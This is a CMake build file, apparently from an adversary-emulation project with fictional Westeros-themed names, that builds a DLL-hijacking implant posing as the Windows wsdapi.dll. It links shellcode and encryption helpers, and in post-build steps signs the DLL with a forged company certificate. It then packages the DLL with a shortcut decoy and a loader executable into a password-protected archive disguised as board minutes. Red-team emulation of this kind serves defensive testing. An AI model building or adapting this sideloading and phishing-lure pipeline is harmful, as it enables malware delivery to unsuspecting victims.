###############################################################################
# WSDAPI HIJACKING DLL
###############################################################################
add_library(
    wsdapi
    SHARED

    "dllmain.cpp"
    "../common/checks.cpp"
    "../common/handler.cpp"
    "../common/handler_util.cpp"
    "../common/logger.cpp"
    "../common/pi_aes_ctr.cpp"
    "../common/pi_base64.cpp"
    "../common/register.cpp"
    "../common/util.cpp"
    "../common/xor.cpp"
    "wsdapi.def"
)

add_dependencies(
    wsdapi
    shellcode-pe
)

target_compile_definitions(
    wsdapi
    PRIVATE
    DESIRED_PROCESS_NAME="EssosUpdate.exe"
    DLL_HANDLER_LOG_FILE="C:\\\\Windows\\\\System32\\\\wsdapih.log"
    DLL_SH_RUNNER_LOG_FILE="C:\\\\Windows\\\\System32\\\\wsdapisr.log"
    DLL_REG_LOG_FILE="C:\\\\Windows\\\\System32\\\\wsdapireg.log"
    TARGET_MODULE="wsdapi.dll"
    TARGET_MODULE_SYS32="C:\\\\Windows\\\\System32\\\\wsdapi.dll"
    TARGET_MODULE_SYSWOW="C:\\\\Windows\\\\SysWOW64\\\\wsdapi.dll"
    ENCRYPTED_LOGGING=1 # set to 0 to disable, set to non-0 to enable
)

# Sign DLL and build .rar
add_custom_command(
    TARGET wsdapi
    POST_BUILD
    COMMAND
        echo "wsdapi target built with CMAKE_CXX flags: ${CMAKE_CXX_FLAGS}"
    COMMAND
        powershell.exe -File "${CMAKE_SOURCE_DIR}/src/common/sign_artifact.ps1" -Target "$<TARGET_FILE:wsdapi>" -CertSubject "CN=Tully Enterprises, O=Tully Enterprises, L=Riverrun, S=Riverlands, C=Westeros" -CertDnsName "Tully Enterprises" -CertExportPath "$<TARGET_FILE_DIR:wsdapi>/toneshell.pfx"
    COMMAND
        rar.exe a -hpPentos -ep "$<TARGET_FILE_DIR:wsdapi>/250325_Pentos_Board_Minutes.rar" "${CMAKE_SOURCE_DIR}/src/wsdapi/Essos Competitiveness Brief.lnk" "$<TARGET_FILE:wsdapi>" "${CMAKE_SOURCE_DIR}/EssosUpdate.exe"
)

target_include_directories(
    wsdapi
    PUBLIC
    "${CMAKE_SOURCE_DIR}/src/wsdapi"
    "${CMAKE_SOURCE_DIR}/src/common"
)
